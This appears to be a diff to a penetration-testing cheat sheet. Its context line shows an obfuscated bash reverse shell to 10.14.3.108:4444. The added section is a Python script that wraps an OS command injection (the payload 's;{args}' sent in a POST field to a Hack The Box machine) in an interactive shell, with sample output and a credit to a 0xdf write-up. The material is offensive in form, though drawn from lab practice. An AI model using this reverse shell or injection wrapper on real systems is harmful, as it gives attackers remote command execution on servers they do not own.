@@ -48,3 +48,36 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.14.3.108/4444 0>&1' | base64 | base64)
 ```
 
 Now execute the generate output of the command above and try to execute it.\
+
+# OS Command Injection Script
+
+If there's an OS command injection vulnerability we can simulate terminal with python3:
+
+```python
+#!/usr/bin/python3
+
+import requests
+from bs4 import BeautifulSoup
+from cmd import Cmd
+
+class Terminal(Cmd):
+    prompt = "terminal> "
+
+    def default(self, args):
+        resp = requests.post('http://10.10.10.127/select', data={"param_name": f"s;{args} 2>&1"}, proxies={"http": "http://127.0.0.1:8080"})
+        soup = BeautifulSoup(resp.text, 'html.parser')
+        print(soup.find("pre").text.strip())
+
+term = Terminal()
+term.cmdloop()
+```
+
+Execute the script:
+
+```sh
+root@kali# ./fortune_shell.py 
+terminal> pwd
+/var/www/appname/
+```
+
+Reference from [0xdf HTB Fortune writeup](https://0xdf.gitlab.io/2019/08/03/htb-fortune.html#rce-as-www-data)
